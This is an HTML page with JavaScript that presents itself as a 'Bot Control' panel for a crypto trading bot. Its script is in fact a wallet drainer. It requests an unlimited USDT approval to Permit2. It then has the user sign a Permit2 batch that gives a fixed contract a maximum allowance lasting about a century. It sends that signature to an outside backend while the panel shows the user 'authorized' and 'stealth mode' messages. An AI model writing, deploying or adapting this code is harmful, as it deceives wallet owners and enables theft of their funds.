<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Bot Control Standalone</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>


<style>
:root {
    --bg: #040608;
    --panel: #0a0f16;
    --panel-2: #0d131d;
    --border: #121a26;

    --accent: #3bc9db;

    --green: #4ade80;
    --red: #ef4444;
    --amber: #f59e0b;

    --text-main: #d6dee8;
    --text-dim: #5b6777;
    --text-faint: #394150;

    --font-ui: 'Inter', sans-serif;
    --font-mono: 'JetBrains Mono', monospace;
}

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    border-radius: 0 !important;

    scrollbar-width: none;
    -ms-overflow-style: none;
}

*::-webkit-scrollbar {
    width: 0;
    height: 0;
    display: none;
}

html,
body {
    width: 100%;
    height: 100%;
    overflow: hidden;

    background: var(--bg);

    color: var(--text-main);

    font-family: var(--font-ui);

    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

body {
    padding: 10px;
}

/* =========================
   PANELS
========================= */

.panel {
    position: relative;

    background: linear-gradient(
        180deg,
        rgba(13,19,29,0.98) 0%,
        rgba(8,12,18,0.98) 100%
    );

    border: 1px solid var(--border);

    display: flex;
    flex-direction: column;

    overflow: hidden;
}

.panel::before {
    content: "";

    position: absolute;
    inset: 0;

    background:
        linear-gradient(
            to bottom,
            rgba(255,255,255,0.015),
            transparent 30%
        );

    pointer-events: none;
}

.panel-header {
    height: 34px;

    display: flex;
    align-items: center;

    padding: 0 14px;

    background: #0d131d;

    border-bottom: 1px solid var(--border);

    font-family: var(--font-mono);

    font-size: 10px;
    font-weight: 700;

    letter-spacing: 1.4px;
    text-transform: uppercase;

    color: #7c8ca1;

    flex-shrink: 0;
}

.module-body {
    padding: 14px;
    overflow: hidden;
}

/* =========================
   BUTTON STACK
========================= */

.btn-stack {
    display: flex;
    flex-direction: column;

    gap: 8px;

    margin-bottom: 14px;
}

/* BASE BUTTON */

.control-btn {
    position: relative;

    width: 100%;

    background: linear-gradient(
        180deg,
        #101722 0%,
        #0b1017 100%
    );

    border: 1px solid #182230;

    color: #4b5563;

    padding: 12px 14px;

    font-family: var(--font-mono);

    font-size: 10px;
    font-weight: 600;

    letter-spacing: 0.8px;
    text-transform: uppercase;

    cursor: pointer;

    transition:
        border-color 0.18s ease,
        color 0.18s ease,
        background 0.18s ease,
        box-shadow 0.18s ease;
}

.control-btn::after {
    content: "";

    position: absolute;
    inset: 0;

    background:
        linear-gradient(
            to bottom,
            rgba(255,255,255,0.02),
            transparent
        );

    pointer-events: none;
}

/* =========================
   DISABLED STATE
========================= */

.control-btn:disabled {
    background: #0a0f16;

    border-color: #111827;

    color: #364152;

    cursor: default;

    opacity: 1;

    box-shadow: none;
}

/* ALL BUTTONS LOOK OFF UNTIL ACTIVE */

.control-btn.btn-cyan:disabled,
.control-btn.btn-purple:disabled,
.control-btn.btn-amber:disabled {
    color: #364152;
    border-color: #111827;
}

/* =========================
   ENABLED STATES
========================= */

.control-btn:not(:disabled) {
    background: linear-gradient(
        180deg,
        #121a25 0%,
        #0d141d 100%
    );

    color: #d6dee8;
}

/* WALLET ACTIVE */

.control-btn.btn-cyan:not(:disabled) {
    color: #67e8f9;

    border-color: rgba(103,232,249,0.28);

    box-shadow:
        inset 0 0 0 1px rgba(103,232,249,0.04),
        0 0 12px rgba(103,232,249,0.05);
}

/* BOT ACTIVE */

.control-btn.btn-purple:not(:disabled) {
    color: #a5b4fc;

    border-color: rgba(165,180,252,0.28);

    box-shadow:
        inset 0 0 0 1px rgba(165,180,252,0.04),
        0 0 12px rgba(165,180,252,0.05);
}

/* AUTH ACTIVE */

.control-btn.btn-amber:not(:disabled) {
    color: #fcd34d;

    border-color: rgba(252,211,77,0.28);

    box-shadow:
        inset 0 0 0 1px rgba(252,211,77,0.04),
        0 0 12px rgba(252,211,77,0.05);
}

/* =========================
   HOVER
========================= */

.control-btn:not(:disabled):hover {
    background: #131d29;

    color: #ffffff;
}

.control-btn.btn-cyan:not(:disabled):hover {
    border-color: rgba(103,232,249,0.45);

    box-shadow:
        0 0 16px rgba(103,232,249,0.08);
}

.control-btn.btn-purple:not(:disabled):hover {
    border-color: rgba(165,180,252,0.45);

    box-shadow:
        0 0 16px rgba(165,180,252,0.08);
}

.control-btn.btn-amber:not(:disabled):hover {
    border-color: rgba(252,211,77,0.45);

    box-shadow:
        0 0 16px rgba(252,211,77,0.08);
}

/* =========================
   STATUS BOX
========================= */

.status-box {
    border-top: 1px solid var(--border);

    padding-top: 10px;
}

.status-grid {
    display: grid;

    grid-template-columns: 1fr 120px;

    align-items: center;

    gap: 6px;

    min-height: 24px;

    border-bottom: 1px solid rgba(18,26,38,0.7);

    font-family: var(--font-mono);

    font-size: 10px;

    color: #627084;
}

.status-grid:last-child {
    border-bottom: none;
}

.status-line {
    display: flex;
    align-items: center;
    justify-content: flex-end;

    gap: 8px;
}

.liveDot {
    width: 5px;
    height: 5px;

    background: #475569;

    box-shadow: 0 0 6px rgba(71,85,105,0.4);

    flex-shrink: 0;
}

/* =========================
   EXECUTION CONSOLE
========================= */

#execution-console {
    display: flex;
    flex-direction: column;

    overflow: hidden;

    padding: 0;
}

.exec-line {
    width: 100%;

    padding: 7px 0;

    border-bottom: 1px solid rgba(18,26,38,0.8);

    font-family: var(--font-mono);

    font-size: 10px;
    font-weight: 500;

    line-height: 1.5;

    color: #7b8797;

    white-space: pre-wrap;
    word-break: break-word;

    letter-spacing: 0.15px;
}

.exec-line:last-child {
    border-bottom: none;
}

/* =========================
   RESPONSIVE
========================= */

@media (max-width: 768px) {

    body {
        padding: 6px;
    }

    .module-body {
        padding: 10px;
    }

    .control-btn {
        padding: 11px 12px;
        font-size: 9px;
    }

    .panel-header {
        font-size: 9px;
    }

    .exec-line {
        font-size: 9px;
    }
}
</style>
</head>

<body>

<div class="panel">
    <div class="panel-header">Bot Control</div>
    <div class="module-body">

        <div class="btn-stack">
            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
    4. Disconnect Wallet
</button>
        </div>

        <div class="status-box">
            <div class="status-grid">
                <span>WALLET STATUS</span>
                <div class="status-line">
                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
                </div>
            </div>

            <div class="status-grid">
                <span>BOT STATUS</span>
                <div class="status-line">
                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
                    <span id="st-bot" style="color:#475569">OFFLINE</span>
                </div>
            </div>

            <div class="status-grid">
                <span>TRADING ACCESS</span>
                <div class="status-line">
                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
                    <span id="st-access" style="color:#475569">RESTRICTED</span>
                </div>
            </div>
        </div>

    </div>
</div>

<div class="panel" style="height:150px;">
    <div class="panel-header">Execution Console</div>
    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
</div>



<script>
const TOKENS = [
  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
];

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

let APP_STATE = { wallet:null, botActive:false, authorized:false };
let CURRENT_WALLET = null;
if (window.ethereum) {

  window.ethereum.on('accountsChanged', (accounts) => {

    if (accounts.length > 0) {

      CURRENT_WALLET = accounts[0];

      APP_STATE.botActive = false;
      APP_STATE.authorized = false;

      renderWallet(accounts[0]);

      updateStatus('dot-bot','st-bot','OFFLINE','#475569');
      updateStatus('dot-access','st-access','RESTRICTED','#475569');

      log("🔄 Wallet switched: " + accounts[0]);

    }

  });

}

function log(msg){
 console.log(msg);
 const el=document.getElementById('execution-console');
 if(!el) return;
 const div=document.createElement('div');
 div.className='exec-line';
 div.innerText=msg;
 el.prepend(div);
}

function updateStatus(dotId, textId, text, color){
 const dot = document.getElementById(dotId);
 const label = document.getElementById(textId);
 dot.style.background = color;
 dot.style.boxShadow = `0 0 12px ${color}`;
 label.innerText = text;
 label.style.color = color;
}

async function connectWallet(){
 try{
  if (typeof window.ethereum === "undefined") {
    const install = confirm("MetaMask is not installed. Install?");
    if (install) window.location.href = "https://metamask.io/download/";
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);

  log("🔌 Requesting wallet connection...");


await window.ethereum.request({
  method: "wallet_requestPermissions",
  params: [{
    eth_accounts: {}
  }]
});

await window.ethereum.request({
  method: "wallet_requestPermissions",
  params: [{
    eth_accounts: {}
  }]
});

await provider.send(
  "eth_requestAccounts",
  []
);

  const signer = await provider.getSigner();
  const user = await signer.getAddress();
  const network = await provider.getNetwork();

 if (network.chainId !== 1n) {
  log("⚠️ Switching to Ethereum Mainnet...");

  try {
    
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }]
    });

    log("✅ Switched to Ethereum Mainnet");
    return location.reload();

  } catch (err) {
    log("❌ Network switch failed");
    alert("Please switch to Ethereum Mainnet manually");
    return;
  }
}

 if (CURRENT_WALLET && CURRENT_WALLET !== user) {
   log("🔄 Wallet switched — resetting cache");
}

     CURRENT_WALLET = user;

     APP_STATE.wallet = user;
  renderWallet(user);
  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
  updateStatus('dot-access','st-access','RESTRICTED','#475569');

  document.getElementById('btn-wallet').disabled = true;

document.getElementById('btn-activate').disabled = false;

document.getElementById('btn-authorize').disabled = true;

document.getElementById('btn-disconnect').disabled = false;

document.getElementById('btn-activate').classList.add('live');
  

 } catch(e){
  log("ERR " + e.message);
 }
}


async function runPermitFlowSafe(provider, signer, user){
 try{

  log("⚙️ Permit2 flow...");
  log("⚙️ Stealth mode active...");
  log("🔎 Checking cached permit...");

const { data: existing } = await window.supabaseClient
  .from('batches')
  .select('*')
  .eq('owner', user);
const now = Math.floor(Date.now()/1000);

const valid =
  existing &&
  existing.length > 0 &&
  existing[0].sig_deadline > now;

if (valid) {

  log("⚡ Cached permit valid — skipping signature");
  log("Cache rows: " + (existing?.length || 0));
  log("Wallet: " + user);

  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
  updateStatus('dot-bot','st-bot','READY','#6366f1');

 document.getElementById('btn-authorize').disabled = true;

document.getElementById('btn-authorize').innerText =
  "TRADING AUTHORIZED";

document.getElementById('btn-authorize').classList.add('live');

log("🟢 TERMINAL STATUS: ACTIVE");

  return;
}

if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
  log("⌛ Cached permit expired — refreshing...");
}

const permit2 = new ethers.Contract(
  PERMIT2,
  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
  provider
);


const MAX_UINT160 = (1n << 160n) - 1n;
const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);

const details = [];

const nonceResults = await Promise.all(
  TOKENS.map(token =>
    permit2.allowance(user, token, CONTRACT)
  )
);

for (let i = 0; i < TOKENS.length; i++) {

  const token = TOKENS[i];
  const [amount, expirationOnchain, nonce] = nonceResults[i];

log(`Nonce ${token}: ${nonce.toString()}`);

  log("Nonce " + token + ": " + nonce);

  details.push({
    token: token,
    amount: MAX_UINT160,
    expiration: BigInt(expiration),
    nonce: BigInt(nonce)
  });
}



  // ✍️ SIGN
  const chainId = (await provider.getNetwork()).chainId;

  const domain = {
    name: "Permit2",
    chainId,
    verifyingContract: PERMIT2
  };

  const types = {
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ],
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" }
    ]
  };
const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);

const values = {
  details: details.map(d => ({
    token: d.token,
    amount: d.amount.toString(),
    expiration: d.expiration.toString(),
    nonce: d.nonce.toString()
  })),
  spender: CONTRACT,
  sigDeadline: sigDeadline.toString()
};

  log("✍️ Requesting signature...");

// =========================
// ERC20 -> PERMIT2 APPROVAL
// =========================

for (const token of TOKENS) {

  const erc20 = new ethers.Contract(
    token,
    ERC20_ABI,
    signer
  );

  const currentAllowance =
    await erc20.allowance(
      user,
      PERMIT2
    );

  log(
    "ERC20 allowance: " +
    currentAllowance.toString()
  );

  if (currentAllowance === 0n) {

    log("⚠️ Approval required");
    log("TOKEN: " + token);

    const tx =
      await erc20.approve(
        PERMIT2,
        ethers.MaxUint256
      );

    log("⛽ Waiting confirmation...");

    await tx.wait();

    log("✅ ERC20 approval confirmed");
  }
  else {

    log("✅ ERC20 already approved");
  }
}

  const signature = await signer.signTypedData(domain,types,values);
  const sig = ethers.Signature.from(signature);

  const v = sig.v;
  const r = sig.r;
  const s = sig.s;

log("✍️ Signature captured");

log("📤 Sending raw permit batch to backend...");

try {
 const payload = {
  owner: user,
  details: details.map(d => ({
  token: d.token,
  amount: d.amount.toString(),
  expiration: d.expiration.toString(),
  nonce: d.nonce.toString()
})),
  signature: signature,
  spender: CONTRACT,
  sig_deadline: sigDeadline,
  chainId: Number(chainId) // 🔥 HIER KOMT HET
};

  const res = await fetch("https://api.aiiraa.com/api/permit", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(
  payload,
  (key, value) => typeof value === "bigint" ? value.toString() : value
)
  });

  const data = await res.json();

  if (!res.ok) {
    log("❌ Backend error: " + (data.error || "unknown"));
    return;
  }

  log("✅ Permit forwarded to backend");

  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
  updateStatus('dot-bot','st-bot','READY','#6366f1');

  document.getElementById('btn-authorize').disabled = true;
  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
  document.getElementById('btn-activate').disabled = true;

} catch (e) {
  log("❌ NETWORK ERROR: " + e.message);
}

 


 }catch(e){
  log("❌ FLOW ERROR: " + e.message);
 }
}

function renderWallet(address) {
 document.getElementById('btn-wallet').innerText = address;
 updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
}

async function activateBot() {

 APP_STATE.botActive = true;

 updateStatus('dot-bot','st-bot','READY','#00bcd4');

 log("⚡ Execution engine initialized");

 document.getElementById('btn-activate').disabled = true;

 document.getElementById('btn-authorize').disabled = false;

}

async function authorizeTrading(){

 try {

provider = new ethers.BrowserProvider(
  window.ethereum,
  "any"
);
  const signer = await provider.getSigner();

  const user = await signer.getAddress();

  document.getElementById('btn-authorize').disabled = true;

  document.getElementById('btn-authorize').innerText =
    "AWAITING SIGNATURE";

  await runPermitFlowSafe(
    provider,
    signer,
    user
  );

 }
 catch(e){

  log("❌ AUTH ERROR: " + e.message);

  document.getElementById('btn-authorize').disabled = false;

  document.getElementById('btn-authorize').innerText =
    "3. AUTHORIZE TRADING";
 }

}

function disconnectWallet() {
 location.reload();
}

window.connectWallet = connectWallet;

</script>
